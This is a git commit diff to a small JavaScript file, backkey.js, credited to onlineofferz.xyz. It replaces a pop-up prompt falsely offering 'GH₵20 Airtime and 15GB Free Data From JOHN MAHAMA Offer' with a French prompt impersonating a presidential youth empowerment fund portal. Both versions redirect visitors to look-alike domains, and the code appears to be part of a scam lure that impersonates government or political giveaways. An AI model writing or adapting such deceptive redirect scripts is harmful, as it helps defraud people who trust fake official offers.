cc1fd494b8a9d83e2984868f9bdbbb426b58f016
lagalfredben <lagalfredben@gmail.com>
2026-04-26 02:00:52 +0100

    Update backkey.js

--- backkey.js
+++ backkey.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'Appliquer'
+password=prompt('SMS: BIENVENUE SUR LE PORTAIL DE DEMANDE DU FONDS PRÉSIDENTIEL POUR LAUTONOMISATION DES JEUNES ','Appliquer');
+if (password != 'Appliquer') {
+location.href='https://jeunesse.govserves.site/Gift';
 }
